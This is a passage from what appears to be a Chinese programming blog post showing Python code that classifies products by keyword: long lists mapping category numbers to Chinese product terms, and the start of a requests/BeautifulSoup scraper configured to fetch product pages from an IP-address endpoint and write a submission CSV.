<span class="hljs-string">&#x27;厨房清洁剂&#x27;</span>, <span class="hljs-string">&#x27;玻璃水&#x27;</span>, <span class="hljs-string">&#x27;除霉剂&#x27;</span>,<br>          <span class="hljs-string">&#x27;空气清新剂&#x27;</span>, <span class="hljs-string">&#x27;香薰&#x27;</span>, <span class="hljs-string">&#x27;除螨仪&#x27;</span>, <span class="hljs-string">&#x27;洗衣凝珠&#x27;</span>, <span class="hljs-string">&#x27;衣物除菌液&#x27;</span>]),<br><br>    (<span class="hljs-number">7</span>, [<span class="hljs-string">&#x27;办公&#x27;</span>, <span class="hljs-string">&#x27;打印机&#x27;</span>, <span class="hljs-string">&#x27;投影仪&#x27;</span>, <span class="hljs-string">&#x27;复印纸&#x27;</span>, <span class="hljs-string">&#x27;文件夹&#x27;</span>, <span class="hljs-string">&#x27;订书机&#x27;</span>, <span class="hljs-string">&#x27;碎纸机&#x27;</span>, <span class="hljs-string">&#x27;考勤机&#x27;</span>,<br>         <span class="hljs-string">&#x27;白板&#x27;</span>, <span class="hljs-string">&#x27;会议电话&#x27;</span>, <span class="hljs-string">&#x27;文件柜&#x27;</span>, <span class="hljs-string">&#x27;保险箱&#x27;</span>, <span class="hljs-string">&#x27;装订机&#x27;</span>, <span class="hljs-string">&#x27;标签机&#x27;</span>, <span class="hljs-string">&#x27;支票打印机&#x27;</span>,<br>         <span class="hljs-string">&#x27;扫描仪&#x27;</span>, <span class="hljs-string">&#x27;指纹打卡机&#x27;</span>, <span class="hljs-string">&#x27;办公沙发&#x27;</span>, <span class="hljs-string">&#x27;会议桌&#x27;</span>, <span class="hljs-string">&#x27;办公隔断&#x27;</span>]),<br><br>    (<span class="hljs-number">3</span>, [<span class="hljs-string">&#x27;家居&#x27;</span>, <span class="hljs-string">&#x27;沙发&#x27;</span>, <span class="hljs-string">&#x27;茶几&#x27;</span>, <span class="hljs-string">&#x27;窗帘&#x27;</span>, <span class="hljs-string">&#x27;地毯&#x27;</span>, <span class="hljs-string">&#x27;衣柜&#x27;</span>, <span class="hljs-string">&#x27;餐桌&#x27;</span>, <span class="hljs-string">&#x27;电视柜&#x27;</span>, <span class="hljs-string">&#x27;鞋柜&#x27;</span>,<br>         <span class="hljs-string">&#x27;置物架&#x27;</span>, <span class="hljs-string">&#x27;装饰画&#x27;</span>, <span class="hljs-string">&#x27;花瓶&#x27;</span>, <span class="hljs-string">&#x27;壁纸&#x27;</span>, <span class="hljs-string">&#x27;灯具&#x27;</span>, <span class="hljs-string">&#x27;智能门锁&#x27;</span>, <span class="hljs-string">&#x27;晾衣架&#x27;</span>, <span class="hljs-string">&#x27;收纳盒&#x27;</span>,<br>         <span class="hljs-string">&#x27;墙贴&#x27;</span>, <span class="hljs-string">&#x27;门垫&#x27;</span>, <span class="hljs-string">&#x27;家居摆件&#x27;</span>, <span class="hljs-string">&#x27;香炉&#x27;</span>]),<br><br>    (<span class="hljs-number">9</span>, [<span class="hljs-string">&#x27;宠物&#x27;</span>, <span class="hljs-string">&#x27;猫粮&#x27;</span>, <span class="hljs-string">&#x27;狗粮&#x27;</span>, <span class="hljs-string">&#x27;宠物窝&#x27;</span>, <span class="hljs-string">&#x27;牵引绳&#x27;</span>, <span class="hljs-string">&#x27;猫砂&#x27;</span>, <span class="hljs-string">&#x27;宠物玩具&#x27;</span>, <span class="hljs-string">&#x27;宠物衣服&#x27;</span>,<br>         <span class="hljs-string">&#x27;宠物浴液&#x27;</span>, <span class="hljs-string">&#x27;驱虫药&#x27;</span>, <span class="hljs-string">&#x27;宠物笼&#x27;</span>, <span class="hljs-string">&#x27;食盆&#x27;</span>, <span class="hljs-string">&#x27;自动喂食器&#x27;</span>, <span class="hljs-string">&#x27;猫抓板&#x27;</span>, <span class="hljs-string">&#x27;宠物推车&#x27;</span>,<br>         <span class="hljs-string">&#x27;宠物背包&#x27;</span>, <span class="hljs-string">&#x27;宠物美容&#x27;</span>, <span class="hljs-string">&#x27;宠物医院&#x27;</span>, <span class="hljs-string">&#x27;宠物殡葬&#x27;</span>, <span class="hljs-string">&#x27;宠物芯片&#x27;</span>]),<br><br>    (<span class="hljs-number">13</span>, [<span class="hljs-string">&#x27;保健&#x27;</span>, <span class="hljs-string">&#x27;鱼油&#x27;</span>, <span class="hljs-string">&#x27;维生素&#x27;</span>, <span class="hljs-string">&#x27;钙片&#x27;</span>, <span class="hljs-string">&#x27;蛋白粉&#x27;</span>, <span class="hljs-string">&#x27;益生菌&#x27;</span>, <span class="hljs-string">&#x27;褪黑素&#x27;</span>, <span class="hljs-string">&#x27;护肝片&#x27;</span>,<br>          <span class="hljs-string">&#x27;胶原蛋白&#x27;</span>, <span class="hljs-string">&#x27;葡萄籽&#x27;</span>, <span class="hljs-string">&#x27;辅酶Q10&#x27;</span>, <span class="hljs-string">&#x27;氨糖&#x27;</span>, <span class="hljs-string">&#x27;膳食纤维&#x27;</span>, <span class="hljs-string">&#x27;蜂胶&#x27;</span>, <span class="hljs-string">&#x27;冬虫夏草&#x27;</span>,<br>          <span class="hljs-string">&#x27;阿胶&#x27;</span>, <span class="hljs-string">&#x27;燕窝&#x27;</span>, <span class="hljs-string">&#x27;人参&#x27;</span>, <span class="hljs-string">&#x27;灵芝孢子粉&#x27;</span>, <span class="hljs-string">&#x27;按摩器&#x27;</span>, <span class="hljs-string">&#x27;足浴盆&#x27;</span>]),<br><br>    (<span class="hljs-number">19</span>, [<span class="hljs-string">&#x27;五金&#x27;</span>, <span class="hljs-string">&#x27;螺丝刀&#x27;</span>, <span class="hljs-string">&#x27;电钻&#x27;</span>, <span class="hljs-string">&#x27;扳手&#x27;</span>, <span class="hljs-string">&#x27;工具箱&#x27;</span>, <span class="hljs-string">&#x27;角磨机&#x27;</span>, <span class="hljs-string">&#x27;电锤&#x27;</span>, <span class="hljs-string">&#x27;切割机&#x27;</span>,<br>          <span class="hljs-string">&#x27;水平仪&#x27;</span>, <span class="hljs-string">&#x27;卷尺&#x27;</span>, <span class="hljs-string">&#x27;钳子&#x27;</span>, <span class="hljs-string">&#x27;焊枪&#x27;</span>, <span class="hljs-string">&#x27;砂轮机&#x27;</span>, <span class="hljs-string">&#x27;冲击钻&#x27;</span>, <span class="hljs-string">&#x27;电动螺丝刀&#x27;</span>, <span class="hljs-string">&#x27;开孔器&#x27;</span>,<br>          <span class="hljs-string">&#x27;水管配件&#x27;</span>, <span class="hljs-string">&#x27;阀门&#x27;</span>, <span class="hljs-string">&#x27;密封胶&#x27;</span>, <span class="hljs-string">&#x27;膨胀螺栓&#x27;</span>, <span class="hljs-string">&#x27;绝缘胶带&#x27;</span>]),<br>]<br></code></pre></td></tr></table></figure><p>然后根据这些分类和关键词重新得到代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># 配置日志</span><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br>logger = logging.getLogger(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;集中管理配置参数&quot;&quot;&quot;</span><br>    BASE_DOMAIN = <span class="hljs-string">&quot;http://47.117.190.214:32800/&quot;</span><br>    ENDPOINT = <span class="hljs-string">&quot;/index.php&quot;</span><br>    REQUEST_TIMEOUT = <span class="hljs-number">15</span><br>    MAX_PRODUCTS = <span class="hljs-number">500</span><br>    OUTPUT_FILE = <span class="hljs-string">&quot;submit_2.csv&quot;</span><br>    HEADERS = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 &quot;</span><br>                      <span class="hljs-string">&quot;(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span><br>    &#125;<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">full_url</span>(<span class="hljs-params">cls</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;生成完整请求URL&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> urljoin(cls.BASE_DOMAIN, cls.ENDPOINT)<br><br><br><span class="hljs-comment"># 分类关键词映射表（优先级从高到低）</span><br>CATEGORY_KEYWORDS = [<br>    (<span class="hljs-number">11</span>, [<span class="hljs-string">&#x27;热水器&#x27;</span>, <span class="hljs-string">&#x27;速热&#x27;</span>, <span class="hljs-string">&#x27;恒温&#x27;</span>, <span class="hljs-string">&#x27;防干烧&#x27;</span>, <span class="hljs-string">&#x27;即热式&#x27;</span>, <span class="hljs-string">&#x27;储水式&#x27;</span>, <span class="hljs-string">&#x27;电热水器&#x27;</span>, <span class="hljs-string">&#x27;燃气热水器&#x27;</span>,<br>          <span class="hljs-string">&#x27;太阳能热水器&#x27;</span>, <span class="hljs-string">&#x27;空气能热水器&#x27;</span>, <span class="hljs-string">&#x27;壁挂炉&#x27;</span>, <span class="hljs-string">&#x27;热水系统&#x27;</span>, <span class="hljs-string">&#x27;回水装置&#x27;</span>, <span class="hljs-string">&#x27;恒温阀&#x27;</span>,<br>          <span class="hljs-string">&#x27;镁棒&#x27;</span>, <span class="hljs-string">&#x27;防电墙&#x27;</span>, <span class="hljs-string">&#x27;速热电热水器&#x27;</span>, <span class="hljs-string">&#x27;零冷水&#x27;</span>, <span class="hljs-string">&#x27;预即双模&#x27;</span>]),<br><br>    (<span class="hljs-number">16</span>, [<span class="hljs-string">&#x27;汽车&#x27;</span>, <span class="hljs-string">&#x27;车载&#x27;</span>, <span class="hljs-string">&#x27;机油&#x27;</span>, <span class="hljs-string">&#x27;轮胎&#x27;</span>, <span class="hljs-string">&#x27;变速箱&#x27;</span>, <span class="hljs-string">&#x27;刹车片&#x27;</span>, <span class="hljs-string">&#x27;雨刷&#x27;</span>, <span class="hljs-string">&#x27;火花塞&#x27;</span>, <span class="hljs-string">&#x27;滤清器&#x27;</span>,<br>          <span class="hljs-string">&#x27;蓄电池&#x27;</span>, <span class="hljs-string">&#x27;行车记录仪&#x27;</span>, <span class="hljs-string">&#x27;车载充电器&#x27;</span>, <span class="hljs-string">&#x27;汽车贴膜&#x27;</span>, <span class="hljs-string">&#x27;脚垫&#x27;</span>, <span class="hljs-string">&#x27;方向盘套&#x27;</span>, <span class="hljs-string">&#x27;防冻液&#x27;</span>,<br>          <span class="hljs-string">&#x27;玻璃水&#x27;</span>, <span class="hljs-string">&#x27;悬挂系统&#x27;</span>, <span class="hljs-string">&#x27;涡轮增压&#x27;</span>, <span class="hljs-string">&#x27;四轮定位&#x27;</span>, <span class="hljs-string">&#x27;钣金喷漆&#x27;</span>, <span class="hljs-string">&#x27;汽车美容&#x27;</span>, <span class="hljs-string">&#x27;车衣&#x27;</span>]),<br><br>    (<span class="hljs-number">15</span>, [<span class="hljs-string">&#x27;玩具&#x27;</span>, <span class="hljs-string">&#x27;乐高&#x27;</span>, <span class="hljs-string">&#x27;积木&#x27;</span>, <span class="hljs-string">&#x27;钢琴&#x27;</span>, <span class="hljs-string">&#x27;吉他&#x27;</span>, <span class="hljs-string">&#x27;拼图&#x27;</span>, <span class="hljs-string">&#x27;遥控车&#x27;</span>, <span class="hljs-string">&#x27;芭比娃娃&#x27;</span>, <span class="hljs-string">&#x27;变形金刚&#x27;</span>,<br>          <span class="hljs-string">&#x27;拼装模型&#x27;</span>, <span class="hljs-string">&#x27;益智玩具&#x27;</span>, <span class="hljs-string">&#x27;早教机&#x27;</span>, <span class="hljs-string">&#x27;磁力片&#x27;</span>, <span class="hljs-string">&#x27;轨道车&#x27;</span>, <span class="hljs-string">&#x27;毛绒玩具&#x27;</span>, <span class="hljs-string">&#x27;电子琴&#x27;</span>, <span class="hljs-string">&#x27;小提琴&#x27;</span>,<br>          <span class="hljs-string">&#x27;架子鼓&#x27;</span>, <span class="hljs-string">&#x27;尤克里里&#x27;</span>, <span class="hljs-string">&#x27;口琴&#x27;</span>, <span class="hljs-string">&#x27;音乐盒&#x27;</span>, <span class="hljs-string">&#x27;画板&#x27;</span>, <span class="hljs-string">&#x27;橡皮泥&#x27;</span>, <span class="hljs-string">&#x27;沙滩玩具&#x27;</span>]),<br><br>    (<span class="hljs-number">22</span>, [<span class="hljs-string">&#x27;医疗&#x27;</span>, <span class="hljs-string">&#x27;体温计&#x27;</span>, <span class="hljs-string">&#x27;血压仪&#x27;</span>, <span class="hljs-string">&#x27;轮椅&#x27;</span>, <span class="hljs-string">&#x27;助行器&#x27;</span>, <span class="hljs-string">&#x27;血糖仪&#x27;</span>, <span class="hljs-string">&#x27;制氧机&#x27;</span>, <span class="hljs-string">&#x27;雾化器&#x27;</span>, <span class="hljs-string">&#x27;听诊器&#x27;</span>,<br>          <span class="hljs-string">&#x27;医用口罩&#x27;</span>, <span class="hljs-string">&#x27;防护服&#x27;</span>, <span class="hljs-string">&#x27;手术刀&#x27;</span>, <span class="hljs-string">&#x27;针灸针&#x27;</span>, <span class="hljs-string">&#x27;理疗仪&#x27;</span>, <span class="hljs-string">&#x27;康复设备&#x27;</span>, <span class="hljs-string">&#x27;助听器&#x27;</span>, <span class="hljs-string">&#x27;呼吸机&#x27;</span>,<br>          <span class="hljs-string">&#x27;护理床&#x27;</span>, <span class="hljs-string">&#x27;血压计&#x27;</span>, <span class="hljs-string">&#x27;血氧仪&#x27;</span>, <span class="hljs-string">&#x27;消毒柜&#x27;</span>, <span class="hljs-string">&#x27;医用纱布&#x27;</span>, <span class="hljs-string">&#x27;棉签&#x27;</span>, <span class="hljs-string">&#x27;创可贴&#x27;</span>]),<br><br>    (<span class="hljs-number">23</span>, [<span class="hljs-string">&#x27;花卉&#x27;</span>, <span class="hljs-string">&#x27;绿植&#x27;</span>, <span class="hljs-string">&#x27;多肉&#x27;</span>, <span class="hljs-string">&#x27;盆栽&#x27;</span>, <span class="hljs-string">&#x27;种子&#x27;</span>, <span class="hljs-string">&#x27;花盆&#x27;</span>, <span class="hljs-string">&#x27;营养土&#x27;</span>, <span class="hljs-string">&#x27;园艺剪&#x27;</span>, <span class="hljs-string">&#x27;喷壶&#x27;</span>, <span class="hljs-string">&#x27;花架&#x27;</span>,<br>          <span class="hljs-string">&#x27;观叶植物&#x27;</span>, <span class="hljs-string">&#x27;鲜花&#x27;</span>, <span class="hljs-string">&#x27;干花&#x27;</span>, <span class="hljs-string">&#x27;花肥&#x27;</span>, <span class="hljs-string">&#x27;杀虫剂&#x27;</span>, <span class="hljs-string">&#x27;生根粉&#x27;</span>, <span class="hljs-string">&#x27;育苗盘&#x27;</span>, <span class="hljs-string">&#x27;苔藓微景观&#x27;</span>,<br>          <span class="hljs-string">&#x27;水培植物&#x27;</span>, <span class="hljs-string">&#x27;兰花&#x27;</span>, <span class="hljs-string">&#x27;仙人掌&#x27;</span>, <span class="hljs-string">&#x27;绿萝&#x27;</span>, <span class="hljs-string">&#x27;富贵竹&#x27;</span>, <span class="hljs-string">&#x27;发财树&#x27;</span>, <span class="hljs-string">&#x27;文竹&#x27;</span>]),<br><br>    (<span class="hljs-number">25</span>, [<span class="hljs-string">&#x27;园艺工具&#x27;</span>, <span class="hljs-string">&#x27;洒水器&#x27;</span>, <span class="hljs-string">&#x27;铲子&#x27;</span>, <span class="hljs-string">&#x27;花盆&#x27;</span>, <span class="hljs-string">&#x27;营养土&#x27;</span>, <span class="hljs-string">&#x27;修枝剪&#x27;</span>, <span class="hljs-string">&#x27;嫁接刀&#x27;</span>, <span class="hljs-string">&#x27;园艺手套&#x27;</span>,<br>          <span class="hljs-string">&#x27;割草机&#x27;</span>, <span class="hljs-string">&#x27;绿篱机&#x27;</span>, <span class="hljs-string">&#x27;树枝粉碎机&#x27;</span>, <span class="hljs-string">&#x27;园艺锯&#x27;</span>, <span class="hljs-string">&#x27;松土器&#x27;</span>, <span class="hljs-string">&#x27;育苗箱&#x27;</span>, <span class="hljs-string">&#x27;自动喷灌&#x27;</span>,<br>          <span class="hljs-string">&#x27;园艺支架&#x27;</span>, <span class="hljs-string">&#x27;接水盘&#x27;</span>, <span class="hljs-string">&#x27;播种器&#x27;</span>, <span class="hljs-string">&#x27;园艺地布&#x27;</span>, <span class="hljs-string">&#x27;防草布&#x27;</span>, <span class="hljs-string">&#x27;智能花盆&#x27;</span>, <span class="hljs-string">&#x27;植物补光灯&#x27;</span>]),<br><br>    (<span class="hljs-number">2</span>, [<span class="hljs-string">&#x27;母婴&#x27;</span>, <span class="hljs-string">&#x27;奶粉&#x27;</span>, <span class="hljs-string">&#x27;尿不湿&#x27;</span>, <span class="hljs-string">&#x27;婴儿车&#x27;</span>, <span class="hljs-string">&#x27;奶瓶&#x27;</span>, <span class="hljs-string">&#x27;吸奶器&#x27;</span>, <span class="hljs-string">&#x27;孕妇装&#x27;</span>, <span class="hljs-string">&#x27;待产包&#x27;</span>, <span class="hljs-string">&#x27;婴儿床&#x27;</span>,<br>         <span class="hljs-string">&#x27;学步车&#x27;</span>, <span class="hljs-string">&#x27;儿童餐椅&#x27;</span>, <span class="hljs-string">&#x27;隔尿垫&#x27;</span>, <span class="hljs-string">&#x27;哺乳枕&#x27;</span>, <span class="hljs-string">&#x27;温奶器&#x27;</span>, <span class="hljs-string">&#x27;婴儿背带&#x27;</span>, <span class="hljs-string">&#x27;防溢乳垫&#x27;</span>,<br>         <span class="hljs-string">&#x27;婴儿湿巾&#x27;</span>, <span class="hljs-string">&#x27;婴儿沐浴露&#x27;</span>, <span class="hljs-string">&#x27;护臀膏&#x27;</span>, <span class="hljs-string">&#x27;婴儿理发器&#x27;</span>, <span class="hljs-string">&#x27;早教玩具&#x27;</span>, <span class="hljs-string">&#x27;婴儿监护器&#x27;</span>]),<br><br>    (<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;手机&#x27;</span>, <span class="hljs-string">&#x27;5G&#x27;</span>, <span class="hljs-string">&#x27;智能机&#x27;</span>, <span class="hljs-string">&#x27;曲面屏&#x27;</span>, <span class="hljs-string">&#x27;骁龙&#x27;</span>, <span class="hljs-string">&#x27;全面屏&#x27;</span>, <span class="hljs-string">&#x27;快充&#x27;</span>, <span class="hljs-string">&#x27;双卡双待&#x27;</span>, <span class="hljs-string">&#x27;游戏手机&#x27;</span>,<br>         <span class="hljs-string">&#x27;拍照手机&#x27;</span>, <span class="hljs-string">&#x27;防水手机&#x27;</span>, <span class="hljs-string">&#x27;折叠屏&#x27;</span>, <span class="hljs-string">&#x27;AMOLED&#x27;</span>, <span class="hljs-string">&#x27;屏下指纹&#x27;</span>, <span class="hljs-string">&#x27;液冷散热&#x27;</span>, <span class="hljs-string">&#x27;超级快充&#x27;</span>,<br>         <span class="hljs-string">&#x27;升降摄像头&#x27;</span>, <span class="hljs-string">&#x27;HiFi音质&#x27;</span>, <span class="hljs-string">&#x27;NFC功能&#x27;</span>, <span class="hljs-string">&#x27;无线充电&#x27;</span>, <span class="hljs-string">&#x27;移动电源&#x27;</span>, <span class="hljs-string">&#x27;手机壳&#x27;</span>]),<br><br>    (<span class="hljs-number">6</span>, [<span class="hljs-string">&#x27;厨房&#x27;</span>, <span class="hljs-string">&#x27;炒锅&#x27;</span>, <span class="hljs-string">&#x27;菜刀&#x27;</span>, <span class="hljs-string">&#x27;砧板&#x27;</span>, <span class="hljs-string">&#x27;洗碗机&#x27;</span>, <span class="hljs-string">&#x27;电饭煲&#x27;</span>, <span class="hljs-string">&#x27;微波炉&#x27;</span>, <span class="hljs-string">&#x27;压力锅&#x27;</span>, <span class="hljs-string">&#x27;榨汁机&#x27;</span>,<br>         <span class="hljs-string">&#x27;空气炸锅&#x27;</span>, <span class="hljs-string">&#x27;料理机&#x27;</span>, <span class="hljs-string">&#x27;破壁机&#x27;</span>, <span class="hljs-string">&#x27;蒸烤箱&#x27;</span>, <span class="hljs-string">&#x27;油烟机&#x27;</span>, <span class="hljs-string">&#x27;燃气灶&#x27;</span>, <span class="hljs-string">&#x27;消毒柜&#x27;</span>, <span class="hljs-string">&#x27;绞肉机&#x27;</span>,<br>         <span class="hljs-string">&#x27;烘焙模具&#x27;</span>, <span class="hljs-string">&#x27;厨房秤&#x27;</span>, <span class="hljs-string">&#x27;磨刀器&#x27;</span>, <span class="hljs-string">&#x27;沥水篮&#x27;</span>, <span class="hljs-string">&#x27;保鲜盒&#x27;</span>, <span class="hljs-string">&#x27;厨房置物架&#x27;</span>]),<br><br>    (<span class="hljs-number">20</span>, [<span class="hljs-string">&#x27;户外&#x27;</span>, <span class="hljs-string">&#x27;帐篷&#x27;</span>, <span class="hljs-string">&#x27;登山杖&#x27;</span>, <span class="hljs-string">&#x27;睡袋&#x27;</span>, <span class="hljs-string">&#x27;冲锋衣&#x27;</span>, <span class="hljs-string">&#x27;登山鞋&#x27;</span>, <span class="hljs-string">&#x27;户外背包&#x27;</span>, <span class="hljs-string">&#x27;野餐垫&#x27;</span>,<br>          <span class="hljs-string">&#x27;烧烤架&#x27;</span>, <span class="hljs-string">&#x27;露营灯&#x27;</span>, <span class="hljs-string">&#x27;指南针&#x27;</span>, <span class="hljs-string">&#x27;求生哨&#x27;</span>, <span class="hljs-string">&#x27;军刀卡&#x27;</span>, <span class="hljs-string">&#x27;速干衣&#x27;</span>, <span class="hljs-string">&#x27;抓绒衣&#x27;</span>, <span class="hljs-string">&#x27;攀岩绳&#x27;</span>,<br>          <span class="hljs-string">&#x27;冰爪&#x27;</span>, <span class="hljs-string">&#x27;滑雪板&#x27;</span>, <span class="hljs-string">&#x27;钓鱼竿&#x27;</span>, <span class="hljs-string">&#x27;浮潜面镜&#x27;</span>, <span class="hljs-string">&#x27;登山扣&#x27;</span>, <span class="hljs-string">&#x27;头灯&#x27;</span>, <span class="hljs-string">&#x27;户外水壶&#x27;</span>]),<br><br>    (<span class="hljs-number">10</span>, [<span class="hljs-string">&#x27;运动&#x27;</span>, <span class="hljs-string">&#x27;跑步机&#x27;</span>, <span class="hljs-string">&#x27;瑜伽垫&#x27;</span>, <span class="hljs-string">&#x27;哑铃&#x27;</span>, <span class="hljs-string">&#x27;泳镜&#x27;</span>, <span class="hljs-string">&#x27;健身车&#x27;</span>, <span class="hljs-string">&#x27;椭圆机&#x27;</span>, <span class="hljs-string">&#x27;仰卧板&#x27;</span>,<br>          <span class="hljs-string">&#x27;运动护具&#x27;</span>, <span class="hljs-string">&#x27;拉力器&#x27;</span>, <span class="hljs-string">&#x27;跳绳&#x27;</span>, <span class="hljs-string">&#x27;羽毛球拍&#x27;</span>, <span class="hljs-string">&#x27;乒乓球桌&#x27;</span>, <span class="hljs-string">&#x27;足球鞋&#x27;</span>, <span class="hljs-string">&#x27;篮球架&#x27;</span>,<br>          <span class="hljs-string">&#x27;运动手环&#x27;</span>, <span class="hljs-string">&#x27;计步器&#x27;</span>, <span class="hljs-string">&#x27;筋膜枪&#x27;</span>, <span class="hljs-string">&#x27;运动水壶&#x27;</span>, <span class="hljs-string">&#x27;运动毛巾&#x27;</span>, <span class="hljs-string">&#x27;运动背包&#x27;</span>]),<br><br>    (<span class="hljs-number">21</span>, [<span class="hljs-string">&#x27;珠宝&#x27;</span>, <span class="hljs-string">&#x27;钻石&#x27;</span>, <span class="hljs-string">&#x27;黄金&#x27;</span>, <span class="hljs-string">&#x27;翡翠&#x27;</span>, <span class="hljs-string">&#x27;铂金&#x27;</span>, <span class="hljs-string">&#x27;K金&#x27;</span>, <span 